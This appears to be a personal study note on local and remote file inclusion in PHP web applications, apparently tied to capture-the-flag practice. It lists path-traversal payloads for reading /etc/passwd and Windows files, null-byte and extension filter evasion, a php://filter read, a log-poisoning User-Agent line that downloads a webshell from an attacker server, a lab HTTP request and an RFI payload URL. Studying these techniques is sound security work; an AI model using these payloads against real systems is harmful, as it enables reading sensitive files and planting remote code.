# Local File Inclusion and Remote File Inclusion Overview
[Back to Table of Contents](../cysec)

---

[Payload Box - LFI/RFI](https://github.com/payloadbox/rfi-lfi-payload-list)

-----

>### **LFI: Local File Inclusion**

-----


Local file inclusion is a vulnerability that can allow attackers to
traverse the file system due to improperly or non-sanitized requests. \
This may allow an attacker to access sensitive files, ie /etc/passwd


Commonly used attack vector for LFI is '/../../'


````

get.php?file=../../../../etc/passwd

````

This allows traversal through layers of the directories to the root or target folder/directory. How many times depends on the specific system.

This can be determined by encouraging an error, ie:


````

 index.php?lang=jfbdsgd
or 
index.php?page=2/../../../../../etc/passwd

 ````
 which then may return an error, allowing the attacker to determine the number of directories needed to reach to desired file, or which functional call is used, for example,
in php, "include()". 

OS info can sometimes be derived as well:

```

 /get.php?file=../../../../boot.ini

 /get.php?file=../../../../windows/win.ini

 
 ```

### Sanitization and filter evasion:

 
 In PHP 5.3.3 and below, NULL bytes can be used to signify end of string and avoid extension filtering. \
 
index.php?lang=../../../../etc/passwd%00

 Another method of extension filtering evasion is to use:
```
&ext=
```
In the case of a site that automatically appends php at the end of the file name, leaving the extension blank can be a way of evading that.

 Using a '.' can also be used to signify staying within the directory

````

 ../../../../etc/passwd/.

 ````

 Forced directory - if developer forces a directory, evasion is possible by understanding where that directory lies within the levels.

 Evasion may be as simple as adding an extra layer of navigation, ie:


````

 /../../../etc/passwd  --> /../../../../etc/passwd

````
### LFI - Filters

```
/?view=php://filter/read=convert.base64-encode/resource=<path_object>/../../../../../../etc/passwd&ext=
```

- In the case of a blog website, the <path_object> may be "bikes" or whatever the ?view= contains.

### Apache Log Poisoning

Apache log poisoning can be exploited via the user-agent in some cases; php code can be inserted into the user agent, allowing for potential download of malicious code, such as a webshell, from the attacker's server.
```
User-Agent: <?php file_put_contents('shell.php', file_get_contents('http://ip/shell.php'))?>
```
---

Burp suite can be used to evade any request filters that may filter or change characters

Try POST, GET 

If _REQUEST is being used, take advantage of cookies: 


````

POST /challenges////////////chall3.php HTTP/1.1

Host: 10.10.120.210

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Referer: http://10.10.120.210/challenges///////////chall3.php?file=

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Cookie: =../../../etc/flag3

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 25


file=../../../etc/flag3%00

```` 


--------------------------


>### **RFI: Remote File Inclusion**


---------


allow_url_fopen


Overview:

Payload is hosted on attackers servers -> payload injected via HTTP requests using include function -> payload is executed


````

GET /page.php?file=

lang=http://0.0.0.0/r.elf

````


````

O:8:"_construct":1:{s:4:"cookie";s:10:"Some data!";} 

````

---

### Tools:


````

- lfimap

- lfitester

- vailyn

````